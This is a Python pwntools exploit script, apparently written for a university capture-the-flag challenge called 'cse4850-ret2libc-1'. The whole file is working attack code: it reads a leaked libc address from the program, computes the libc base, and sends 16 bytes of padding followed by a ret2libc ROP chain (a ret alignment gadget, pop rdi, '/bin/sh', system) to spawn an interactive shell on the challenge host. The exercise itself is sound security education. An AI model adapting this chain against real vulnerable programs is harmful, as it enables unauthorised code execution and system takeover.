#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-ret2libc-1.chals.io", 443, ssl=True, sni="cse4850-ret2libc-1.chals.io")
    else:
        return process(binary)



def leak_libc(p,e,r,l):


    pad = b"A" * 16


    p.recvuntil(b"Random Value: ")
    leak = int(p.recvline(), 16)

    l.address = leak - l.sym["rand"]

    lrop = ROP(l)

    system = p64(l.sym["system"])
    pop_rdi = p64(lrop.find_gadget(["pop rdi", "ret"])[0])
    binsh = p64(next(l.search(b"/bin/sh\x00")))

    print(f"Rand: {hex(leak)}")
    print(f"Libc Base: {hex(l.address)}")
    print(f"/bin/sh: {hex(u64(binsh))}")
    print(f"pop rdi: {hex(u64(pop_rdi))}")
    print(f"system: {hex(u64(system))}")

    ret = p64(u64(pop_rdi) + 1)
    chain = ret + pop_rdi + binsh + system


    p.sendline(pad + chain)
    p.interactive()


if __name__=="__main__":
    file = "./chal.bin"

    if args.REMOTE:
        l = args.LIBC
    else:
        l = "/usr/lib/libc.so.6"

    print(l)
    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)
    libc = ELF(l)

    print(libcdb.get_build_id_offsets())

    leak_libc(p,e,r,libc)
